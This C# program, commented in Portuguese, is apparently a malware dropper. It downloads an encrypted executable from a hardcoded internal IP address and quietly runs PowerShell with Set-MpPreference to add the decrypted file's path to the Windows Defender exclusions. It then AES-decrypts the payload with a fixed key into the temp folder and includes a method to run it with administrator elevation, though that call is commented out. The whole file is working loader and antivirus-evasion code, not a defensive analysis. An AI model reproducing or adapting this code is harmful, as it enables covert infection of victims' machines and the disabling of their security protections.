using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;
using System.Threading;

public class Program
{
    private static string url = "http://192.168.1.25/Teste2.exe"; // URL do arquivo criptografado

    // Chaves e IVs da criptografia
    private static byte[] key = new byte[]
    {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    };

    private static byte[] iv = new byte[]
    {
        0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
        0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30
    };

    public static void Main(string[] args)
    {
        try
        {
            // Baixa o arquivo criptografado
            string encryptedFilePath = DownloadFile(url);

            // Descriptografa o arquivo
            DecryptFile(encryptedFilePath);

            // Mantém o console aberto para leitura dos logs
            //Console.WriteLine("Pressione Enter para sair...");
            //Console.ReadLine();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro: {ex.Message}");
        }
    }

    // Método para adicionar o arquivo descriptografado à lista de exclusões do Windows Defender
    private static bool AddToWindowsDefenderExclusions(string filePath)
    {
        try
        {
            using (Process process = new Process())
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    Verb = "runas",
                    FileName = "powershell",
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,  // Habilita o redirecionamento da entrada padrão
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };

                process.StartInfo = psi;
                process.Start();

                Console.WriteLine($"Tentando adicionar o seguinte caminho às exclusões do Windows Defender: {filePath}");

                // Execute o comando no PowerShell
                string command = $"Set-MpPreference -ExclusionPath \"{filePath}\"";

                // Escreva o comando no StandardInput
                process.StandardInput.WriteLine(command);
                process.StandardInput.Close(); // Feche a entrada padrão

                // Capture a saída e os erros do PowerShell
                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();

                // Se não houver erros, consideramos que foi bem-sucedido
                if (string.IsNullOrWhiteSpace(errors))
                {
                    Console.WriteLine("Arquivo adicionado às exclusões do Windows Defender.");
                    Thread.Sleep(3000);
                    return true;
                }
                else
                {
                    Console.WriteLine("Erro ao adicionar o arquivo às exclusões do Windows Defender:");
                    Console.WriteLine(errors);
                    return false;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro ao adicionar o arquivo às exclusões do Windows Defender: {ex.Message}");
            return false;
        }
    }
    private static string DownloadFile(string url)
    {
        try
        {
            string tempDir = Path.GetTempPath(); // Diretório temporário do sistema
            string fileName = Path.GetFileName(url); // Obtém apenas o nome do arquivo da URL
            string filePath = Path.Combine(tempDir, fileName); // Caminho completo do arquivo criptografado na pasta temporária

            using (WebClient client = new WebClient())
            {
                Console.WriteLine($"Baixando arquivo criptografado: {fileName}...");
                client.DownloadFile(url, filePath);
                Console.WriteLine("Download completo.");
            }

            return filePath;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro durante o download do arquivo: {ex.Message}");
            throw; // Propaga a exceção para o chamador
        }
    }
    public static void DecryptFile(string inputFile)
    {
        try
        {
            // Diretório temporário do sistema
            string tempDir = Path.GetTempPath();

            // Caminho completo do arquivo descriptografado
            string outputFile = Path.Combine(tempDir, "decrypted_file.exe");

            AddToWindowsDefenderExclusions(outputFile);
            
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (ICryptoTransform decryptor = aesAlg.CreateDecryptor())
                using (CryptoStream cryptoStream = new CryptoStream(fsOutput, decryptor, CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;

                    while ((bytesRead = fsInput.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cryptoStream.Write(buffer, 0, bytesRead);
                    }
                }
            }
            Console.WriteLine("Arquivo descriptografado.");


            // Executa o arquivo descriptografado
            //ExecuteFile(outputFile);
        }

        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro ao descriptografar o arquivo: {ex.Message}");
        }
    }
    private static void ExecuteFile(string filePath)
    {
        try
        {
            Console.WriteLine("Executando arquivo descriptografado...");

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = filePath,
                Verb = "runas" // Solicitar elevação para administrador
            };
            Process.Start(psi);

            Console.WriteLine("Arquivo executado.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ocorreu um erro ao executar o arquivo: {ex.Message}");
        }
    }
}
